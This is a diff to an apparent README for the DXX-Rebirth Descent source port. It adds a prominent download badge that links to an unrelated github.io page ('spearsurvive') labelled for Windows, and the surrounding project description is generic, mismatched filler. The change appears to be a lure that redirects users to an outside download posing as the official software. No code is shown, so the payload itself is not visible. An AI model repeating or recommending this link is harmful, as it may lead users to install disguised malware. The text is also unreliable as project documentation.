@@ -30,6 +30,12 @@ DXX-Rebirth modernizes Descent 1 and 2 with an OpenGL renderer, high-res texture
 
 Whether you're a newcomer or a veteran, DXX-Rebirth provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download DXX-Rebirth](https://img.shields.io/badge/⬇_DOWNLOAD_DXX+Rebirth-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
